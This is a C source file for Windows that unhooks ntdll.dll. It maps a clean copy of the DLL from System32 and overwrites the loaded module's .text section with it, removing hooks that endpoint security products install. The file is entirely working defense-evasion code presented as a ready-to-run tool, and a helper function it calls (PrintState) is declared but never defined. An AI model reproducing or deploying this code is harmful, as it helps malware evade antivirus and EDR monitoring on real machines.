#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define NTDLL "ntdll.dll"

VOID PrintState(char* cSyscallName, PVOID pSyscallAddress);

INT main(VOID) {

    BOOL     bResult          = FALSE;
    HANDLE   hFile            = INVALID_HANDLE_VALUE;
    HANDLE   hSection         = NULL;
    PVOID    pCleanNtdll      = NULL;
    PVOID    pLocalNtdll      = NULL;
    PVOID    pLocalNtdllTxt   = NULL;
    PVOID    pCleanNtdllTxt   = NULL;
    SIZE_T   sNtdllTxtSize    = 0;
    DWORD    dwOldProtection  = 0;
    CHAR     cWinPath[MAX_PATH / 2]  = { 0 };
    CHAR     cNtdllPath[MAX_PATH]    = { 0 };

    printf("[*] Unhooking NTDLL from disk...\n\n");

    printf("[i] Pre-unhook state:\n");
    PrintState("NtProtectVirtualMemory",
        GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));
    printf("\n");

    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        printf("[!] GetWindowsDirectoryA failed (err %lu)\n", GetLastError());
        goto _Exit;
    }
    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    printf("[i] Fetching a clean ntdll.dll by mapping it from disk...\n");
    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA failed (err %lu)\n", GetLastError());
        goto _Exit;
    }

    hSection = CreateFileMappingA(hFile, NULL,
        PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
    if (hSection == NULL) {
        printf("[!] CreateFileMappingA failed (err %lu)\n", GetLastError());
        goto _Exit;
    }

    pCleanNtdll = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    if (pCleanNtdll == NULL) {
        printf("[!] MapViewOfFile failed (err %lu)\n", GetLastError());
        goto _Exit;
    }
    {
        PPEB pPeb = __readgsqword(0x60);
        PLIST_ENTRY pEntry = pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink;
        PLDR_DATA_TABLE_ENTRY pLdr =
            (PLDR_DATA_TABLE_ENTRY)((PBYTE)pEntry - sizeof(LIST_ENTRY));
        pLocalNtdll = pLdr->DllBase;
    }

    printf("\t[i] 'Hooked'   Ntdll Base Address : 0x%p\n", pLocalNtdll);
    printf("\t[i] 'Unhooked' Ntdll Base Address : 0x%p\n\n", pCleanNtdll);

    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Local ntdll DOS signature invalid\n");
        goto _Exit;
    }

    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)(
        (ULONG_PTR)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Local ntdll NT signature invalid\n");
        goto _Exit;
    }

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pCleanNtdllTxt = (PVOID)((ULONG_PTR)pCleanNtdll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize  = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pLocalNtdllTxt || !pCleanNtdllTxt || !sNtdllTxtSize) {
        printf("[!] Could not locate .text section\n");
        goto _Exit;
    }

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
            PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[!] VirtualProtect (writable) failed (err %lu)\n", GetLastError());
        goto _Exit;
    }

    memcpy(pLocalNtdllTxt, pCleanNtdllTxt, sNtdllTxtSize);

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
            dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtect (restore) failed (err %lu)\n", GetLastError());
        goto _Exit;
    }

    printf("[+] Ntdll unhooked successfully\n\n");

    printf("[i] Post-unhook state:\n");
    PrintState("NtProtectVirtualMemory",
        GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

    bResult = TRUE;

_Exit:
    if (pCleanNtdll) UnmapViewOfFile(pCleanNtdll);
    if (hSection)    CloseHandle(hSection);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

    return bResult;
}
